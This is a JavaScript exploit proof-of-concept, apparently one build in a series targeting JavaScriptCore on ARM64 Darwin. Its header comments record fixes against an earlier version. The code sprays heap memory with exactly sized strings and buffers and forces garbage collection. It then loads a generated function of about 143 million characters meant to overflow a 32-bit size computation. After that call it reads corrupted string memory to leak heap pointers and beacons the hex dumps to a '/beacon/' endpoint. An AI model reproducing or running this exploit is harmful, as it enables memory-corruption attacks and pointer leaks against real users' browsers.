// p148b — sweep-leak, corrected-landing build (v120 numbers)
// Fixes vs p148a (out/self-p148a-verdict.md):
//   1. Read phase moved AFTER the overflow call (p148a read pre-sweep — the sweep runs at
//      FIRST call only; onload readings were pre-corruption junk).
//   2. Filler literals are .repeat()-built and length-asserted (p148a's literals were
//      814/798 chars → the 81400 "corruption" was born-in lengths).
//   3. Every allocation is exactly 100,192 B — the corrected landing's link() request size
//      (stride 120: N = 35,792,228 → 120·N = 2^32 + 100,064 → end = 112+100,064 = 100,176
//      → alloc = 16+100,176 = 100,192). StringImpl header = 24B (StringImpl.cpp:51,54;
//      36-bit branch ARM64+Darwin only) ⇒ 8-bit inline data = 100,168 chars.
//   4. N corrected: 35,792,228 (NOT 38,348,816).
//   5. GC churn = 64MB/round ×12 GC-heap butterfly churn + FR-gated abort path
//      (p148a's 30 rounds × ~320KB churn could barely reach one eden GC).
//   6. Beacons: POST first, GET fallback (same-origin '/beacon/' — both sink channels proven).
// Beacon prefix: V148B-

(function() {
  var BOOT_MS = Date.now();
  function tagNow() { return Date.now() - BOOT_MS; }

  var FR_SEEN = false;

  // Beacon: POST first (host.py sink), GET fallback (access-log sink). Both relative URLs.
  function B(tag, body) {
    var url = '/beacon/V148B-' + tag + '?t=' + Date.now();
    try {
      var x = new XMLHttpRequest();
      x.open('POST', url, true);
      if (body) x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body ? '{' + body + '}' : null);
    } catch (e) {
      try {
        var g = new XMLHttpRequest();
        g.open('GET', url + (body ? '&b=' + encodeURIComponent('{' + body + '}') : ''), true);
        g.send();
      } catch (e2) {}
    }
  }

  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT', '"ms0":' + tagNow());

  // ---- PHASE 1: exact-class buffers ----
  var IMPL_DATA = 100168;          // 100,192 − 24 (StringImpl header)
  var TARGET_CLASS = 100192;
  var CANARY = 0x41;               // 'A'

  // Bait strings: .repeat-built of an inline StringImpl, 100,192 B each.
  B('BAIT-START', '"len":' + IMPL_DATA);
  var baits = [];
  for (var i = 0; i < 12; i++) {
    var bait = 'B'.repeat(IMPL_DATA);
    if (bait.length !== IMPL_DATA) { B('BAIT-LEN-ERR-' + i + '-' + bait.length); return; }
    baits.push(bait);
  }
  B('BAIT-DONE-12', '"bytes":' + (12 * TARGET_CLASS));

  // FR-probe buffers: same class, same request size — collectibility witnesses.
  var fr;
  try {
    fr = new FinalizationRegistry(function(h) {
      if (!FR_SEEN) B('GC-BAIT-FREE', '"s":"' + h + '"');
      FR_SEEN = true;
    });
  } catch (e) { B('NO-FR'); fr = null; }
  var probes = [];
  for (var p = 0; p < 12; p++) {
    var ab = new ArrayBuffer(TARGET_CLASS);
    new Uint8Array(ab)[0] = 0xBB;
    probes.push(ab);
  }
  if (fr) {
    for (var q = 0; q < 8; q++) fr.register(probes[q], 'probe' + q);
  }
  B('PROBES-12', '"bytes":' + (12 * TARGET_CLASS));

  // Target strings + substring views sharing the impl data.
  var targets = [], views = [];
  for (var i2 = 0; i2 < 14; i2++) {
    var t = 'A'.repeat(IMPL_DATA);
    if (t.length !== IMPL_DATA) { B('AIR-LEN-ERR-' + i2 + '-' + t.length); return; }
    t.charCodeAt(0); // force inline flatten now
    targets.push(t);
    views.push(t.substring(0, 90168));
  }
  B('TARGETS-14', '"viewLen":' + views[0].length);

  // ---- PHASE 2: free baits, GC pressure (64MB/round ×12), FR gate ----
  B('FREE-START');
  for (var i3 = 0; i3 < baits.length; i3++) baits[i3] = null;
  for (var i4 = 0; i4 < probes.length; i4++) probes[i4] = null;
  baits = null; probes = null;

  var gcRound = 0;
  function gcPressureRound() {
    // 64MB/round GC-heap churn (two ~32MB butterflies), then release.
    var a1 = new Array(4000000).fill(0);
    var a2 = new Array(4000000).fill(0);
    a1[3999999] = gcRound; a2[3999999] = gcRound;
    a1 = null; a2 = null;                    // churn garbage is collectible next round
    gcRound++;
    if (gcRound < 12) {
      setTimeout(gcPressureRound, 25);
    } else {
      B('GC-DONE-12', '"tauMs":' + tagNow());
      if (fr && !FR_SEEN) {
        B('NO-TRIGGER', '"why":"gc-fail-12"');
        return; // abort GATED — the giant call is never made; page survives.
      }
      phaseBuildOverflow();
    }
  }
  gcPressureRound();

  // ---- PHASE 3: build + load the giant function ----
  function phaseBuildOverflow() {
    B('BUILD', '"n":' + 35792228);
    var N = 35792228;
    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;           // 3,792,228

    var callChunk = 'a();'.repeat(CHUNK);    // 16,000,000 chars, asserted below
    if (callChunk.length !== CHUNK * 4) { B('CHUNK-LEN-ERR'); return; }
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__v148fn=function(a){';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__v148ok=true;';
    callChunk = null;

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB', '"mb":' + Math.round(blob.size / 1048576) + ',"ms":' + tagNow());
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__v148ok ? 'OK' : 'FAIL'), '"ms":' + tagNow());
      if (!window.__v148fn) { B('NO-FN'); return; }
      // Reads BEFORE the call are meaningless (p148a's defect) — go straight to the call.
      phaseCallAndRead();
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }

  // ---- PHASE 4: the call; only if it RETURNS do we read (survive-mode) ----
  function phaseCallAndRead() {
    setTimeout(function() {
      B('CALLING');
      var tStart = Date.now();
      var returned = false;
      try { window.__v148fn(function(){}); returned = true; }
      catch (ex) { B('CATCH', '"e":"' + (ex.message || '').substring(0, 40) + '"'); }
      var ms = Date.now() - tStart;

      if (!returned) {
        B('NO-RETURN', '"ms":' + ms);
      } else {
        B('SURVIVED', '"ms":' + ms);
        phaseReadLeak();
      }

      setTimeout(function() {
        B('ALIVE-10S', '"msSinceCall":' + (Date.now() - tStart));
      }, 10000);
    }, 100);
  }

  // ---- PHASE 5: reads POST-sweep (only on SURVIVED) ----
  function phaseReadLeak() {
    var corruptedLen = 0, corruptedData = 0, dumped = 0;
    for (var i = 0; i < targets.length; i++) {
      var len;
      try { len = targets[i].length; } catch (e) { len = -1; }
      var v0;
      try { v0 = views[i].charCodeAt(0); } catch (e) { v0 = -1; }

      if (len !== IMPL_DATA) {
        corruptedLen++;
        B('H-' + i + '-len=' + len, '"ms":' + tagNow());
      }
      if (v0 !== CANARY && v0 !== -1) {
        corruptedData++;
        var ptr = '';
        for (var d = 0; d < 16; d++) ptr += hexByte(views[i].charCodeAt(d));
        B('PTR-' + i + '-' + ptr);
        if (dumped < 4) {
          var hex1 = '';
          for (var b = 0; b < 120; b++) hex1 += hexByte(views[i].charCodeAt(b));
          B('E-' + i + '-' + hex1);
          var idx = '';
          for (var d2 = 60; d2 < 64; d2++) idx += hexByte(views[i].charCodeAt(d2));
          B('IDX-' + i + '-' + idx);
        }
        dumped++;
      } else if (v0 === CANARY && len !== IMPL_DATA) {
        B('JSCORRUPT-' + i, '"note":"hdr-only"');
      }
    }
    B('CORRUPT-' + corruptedLen + '-' + corruptedData + '-LEAKED-' + dumped,
      '"ms":' + tagNow());
    B('FINAL-OK');
  }
})();
